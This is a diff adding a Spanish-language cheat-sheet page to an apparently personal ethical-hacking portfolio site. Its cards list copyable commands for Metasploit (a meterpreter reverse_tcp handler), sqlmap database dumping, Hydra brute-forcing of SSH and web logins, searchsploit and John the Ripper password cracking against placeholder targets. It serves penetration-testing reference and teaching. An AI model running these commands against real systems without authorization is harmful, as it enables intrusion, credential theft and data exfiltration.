@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Jose L. Trigo - Explotación</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,600;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    *,*::before,*::after{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:"Fira Sans",sans-serif;background:#020b14;color:#cbd5dd}
+    a{color:#00a8ff;text-decoration:none;transition:color .2s}
+    a:hover{color:#fff}
+    .wrap{max-width:1180px;margin:28px auto;padding:24px}
+    .fixed-header{position:fixed;top:0;left:0;width:100%;background:#000D1F;border-bottom:1px solid #00a8ff;z-index:1000;padding:.5rem 1.5rem;box-shadow:0 2px 20px rgba(0,168,255,.15)}
+    .header-content{display:flex;justify-content:space-between;align-items:center;max-width:1132px;margin:0 auto}
+    .logo-img{height:38px;width:auto;display:block}
+    .nav-list{list-style:none;display:flex;gap:12px;padding:0;margin:0;align-items:center;flex-wrap:wrap}
+    .nav-item{display:inline-flex;padding:6px 14px;border-radius:4px;background:#020b14;color:#00a8ff;font-family:"JetBrains Mono",monospace;font-weight:700;font-size:.85rem;border:1px solid rgba(0,168,255,.4);transition:all .2s}
+    .nav-item:hover{transform:translateY(-1px);box-shadow:0 0 12px rgba(0,168,255,.3);background:#051628;color:#fff;border-color:#00a8ff}
+    .nav-item.active{background:#00a8ff;color:#020b14;border-color:#00a8ff}
+    body{padding-top:70px}
+    section{margin-bottom:32px;background:#051628;border:1px solid rgba(0,168,255,.2);border-radius:8px;padding:24px;box-shadow:0 4px 20px rgba(0,0,0,.3)}
+    .page-header{display:flex;align-items:center;gap:16px;margin-bottom:8px;flex-wrap:wrap}
+    .page-header .icon{font-size:2.5rem}
+    .page-header h1{color:#e3edf7;font-family:"JetBrains Mono",monospace;font-weight:700;font-size:1.8rem;margin:0}
+    .page-header .back-link{margin-left:auto;font-family:"JetBrains Mono",monospace;font-size:.9rem}
+    .breadcrumb{color:#4a75a0;font-family:"JetBrains Mono",monospace;font-size:.85rem;margin-bottom:20px}
+    .breadcrumb a{color:#00a8ff}
+    .breadcrumb a:hover{color:#fff}
+    .tool-card{background:#020b14;border:1px solid rgba(0,168,255,.15);border-radius:8px;padding:18px 20px;margin-bottom:16px;transition:border-color .3s}
+    .tool-card:hover{border-color:#00a8ff}
+    .tool-card .tool-name{display:flex;align-items:center;gap:12px;margin-bottom:8px;flex-wrap:wrap}
+    .tool-card .tool-name h3{color:#e3edf7;font-family:"JetBrains Mono",monospace;font-size:1.1rem;margin:0}
+    .tool-card .tool-name .badge{background:rgba(0,168,255,.15);padding:2px 10px;border-radius:12px;font-size:.7rem;color:#00a8ff;font-family:"JetBrains Mono",monospace}
+    .tool-card .desc{color:#4a75a0;font-size:.9rem;margin:4px 0 12px 0}
+    .command-block{background:#020b14;border:1px solid rgba(0,168,255,.2);border-radius:4px;padding:10px 14px;display:flex;justify-content:space-between;align-items:center;gap:12px;font-family:"JetBrains Mono",monospace;font-size:.85rem;color:#cbd5dd;margin-top:6px;flex-wrap:wrap}
+    .command-block .cmd{word-break:break-all;flex:1}
+    .command-block .cmd .prompt{color:#00a8ff;font-weight:700}
+    .copy-btn{background:transparent;border:1px solid rgba(0,168,255,.3);color:#00a8ff;padding:4px 12px;border-radius:4px;cursor:pointer;font-family:"JetBrains Mono",monospace;font-size:.7rem;transition:all .2s;white-space:nowrap}
+    .copy-btn:hover{background:#00a8ff;color:#020b14;border-color:#00a8ff}
+    .copy-btn.copied{background:#27c93f;border-color:#27c93f;color:#020b14}
+    .tool-card .extra-commands{margin-top:10px;padding-top:10px;border-top:1px dashed rgba(0,168,255,.1)}
+    .tool-card .extra-commands .command-block{margin-top:6px;border-color:rgba(0,168,255,.1)}
+    footer{padding:20px;margin-top:12px;border-top:1px solid rgba(0,168,255,.15);color:#4a75a0;text-align:center;font-size:.85rem;font-family:"JetBrains Mono",monospace}
+    @media(max-width:720px){.header-content{flex-direction:column;gap:10px}body{padding-top:110px}.nav-item{padding:6px 10px;font-size:.75rem}.command-block{flex-wrap:wrap}.command-block .cmd{font-size:.75rem}.page-header .back-link{margin-left:0}}
+    .fade-in{opacity:0;transform:translateY(8px);animation:fadeIn .6s ease forwards}
+    .fade-in.delay-1{animation-delay:.1s}
+    .fade-in.delay-2{animation-delay:.2s}
+    .fade-in.delay-3{animation-delay:.3s}
+    @keyframes fadeIn{to{opacity:1;transform:none}}
+    .tool-icon{font-size:1.5rem}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header class="fixed-header">
+      <div class="header-content">
+        <span class="logo-container"><img src="../logo.png" alt="Logo JT" class="logo-img" /></span>
+        <nav>
+          <ul class="nav-list">
+            <li><a class="nav-item" href="../#sobre">Sobre mí</a></li>
+            <li><a class="nav-item" href="../#proyectos">Proyectos</a></li>
+            <li><a class="nav-item active" href="index.html">Herramientas</a></li>
+            <li><a class="nav-item" href="../#contacto">Contacto</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <div class="breadcrumb fade-in"><a href="../">Inicio</a> &gt; <a href="index.html">Herramientas</a> &gt; Explotación</div>
+
+    <section class="fade-in delay-1">
+      <div class="page-header">
+        <span class="icon">💥</span>
+        <h1>Explotación</h1>
+        <span class="back-link"><a href="index.html">← Volver al catálogo</a></span>
+      </div>
+      <p style="color:#4a75a0;font-size:1rem;margin-top:4px;">Frameworks de explotación, fuerza bruta, inyecciones y exploits públicos.</p>
+    </section>
+
+    <section class="fade-in delay-2">
+
+      <!-- Metasploit -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">🎯</span><h3>Metasploit</h3><span class="badge">Framework</span></div>
+        <p class="desc">Framework completo para desarrollo y ejecución de exploits.</p>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">msf6 &gt;</span> use exploit/multi/handler</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="extra-commands">
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">msf6 &gt;</span> set PAYLOAD windows/meterpreter/reverse_tcp</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">msf6 &gt;</span> set LHOST 192.168.1.100</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- SQLMap -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">🗄️</span><h3>SQLMap</h3><span class="badge">Inyección SQL</span></div>
+        <p class="desc">Herramienta automatizada para detección y explotación de SQLi.</p>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> sqlmap -u "http://ejemplo.com/page?id=1" --dbs</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="extra-commands">
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">$</span> sqlmap -u "http://ejemplo.com/page?id=1" -D users --tables --dump</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Hydra -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">🔑</span><h3>Hydra</h3><span class="badge">Fuerza Bruta</span></div>
+        <p class="desc">Herramienta de fuerza bruta para servicios SSH, FTP, HTTP, etc.</p>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="extra-commands">
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">$</span> hydra -L users.txt -P pass.txt http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect"</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Searchsploit -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">📚</span><h3>Searchsploit</h3><span class="badge">ExploitDB</span></div>
+        <p class="desc">Búsqueda local en la base de datos de Exploit-DB.</p>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> searchsploit Apache 2.4</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+        <div class="extra-commands">
+          <div class="command-block">
+            <span class="cmd"><span class="prompt">$</span> searchsploit -m 12345</span>
+            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- John the Ripper -->
+      <div class="tool-card">
+        <div class="tool-name"><span class="tool-icon">🔓</span><h3>John the Ripper</h3><span class="badge">Cracking</span></div>
+        <p class="desc">Cracker de contraseñas para hashes de diversos formatos.</p>
+        <div class="command-block">
+          <span class="cmd"><span class="prompt">$</span> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+        </div>
+      </div>
+
+    </section>
+
+    <footer class="fade-in">© 2026 Jose L. Trigo · Ethical Hacker · Comandos actualizados.</footer>
+  </div>
+
+  <script>
+    function copyCommand(btn) {
+      const block = btn.closest('.command-block') || btn.parentElement;
+      const cmdSpan = block.querySelector('.cmd');
+      if (!cmdSpan) return;
+      let cmdText = cmdSpan.textContent;
+      cmdText = cmdText.replace(/^(msf6\s*&gt;\s*|\$\s*)/, '').trim();
+      navigator.clipboard.writeText(cmdText).then(() => {
+        btn.textContent = '✓ Copiado';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 2000);
+      }).catch(() => {
+        const textarea = document.createElement('textarea');
+        textarea.value = cmdText;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        btn.textContent = '✓ Copiado';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 2000);
+      });
+    }
+  </script>
+</body>
+</html>
